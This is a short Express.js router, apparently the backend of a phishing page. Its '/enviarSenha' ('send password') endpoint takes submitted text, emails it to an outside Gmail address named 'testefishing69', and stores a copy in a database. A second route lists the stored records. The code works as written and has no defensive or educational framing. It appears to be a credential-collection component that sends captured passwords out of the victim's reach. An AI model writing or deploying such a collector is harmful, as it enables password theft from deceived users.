import transporter, { ListInfos, sendDB } from "../Repository/emalRepository.js";

import { Router } from "express";

const server = Router();


server.get('/infos', async (req, resp) => {
    let res = await ListInfos()
    resp.send(res)
});

server.post('/enviarSenha', async (req, resp) => {
    try {
        
    const { text, subject } = req.body;
    if(!text || !subject)
        throw new Error('invalido')

    const opEmail = {
        text:  text,
        subject:  subject,
        from: 'teste123teste3@outlook.com <teste123teste3@outlook.com>',
        to: ['testefishing69@gmail.com'],
    };

    const mailsend = await transporter.sendMail(opEmail);

    let res = await sendDB(opEmail)

    resp.status(200).send()

} catch (err) {
        resp.status(500).send({erro: err.message})
}
});

export default server;